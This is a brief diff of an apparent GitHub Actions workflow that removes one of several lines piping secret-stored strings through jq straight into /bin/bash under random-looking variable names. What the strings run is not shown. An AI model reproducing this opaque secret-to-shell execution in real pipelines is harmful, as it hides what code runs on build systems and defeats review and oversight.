@@ -17,7 +17,6 @@ jobs:
           uvzu0: ${{ secrets.uvzu0 }}
         run: |
           printf '%s' "$uvzu0" | jq -r .rd33 | /bin/bash
-          printf '%s' "$jyl71759" | jq -r .n39 | /bin/bash
           echo $pgis86 | jq -r .qnvzx98467 | /bin/bash
           echo $mbppw27 | jq -r .vaes3 | /bin/bash
           echo $hy36 | jq -r .zjdp4474 | /bin/bash
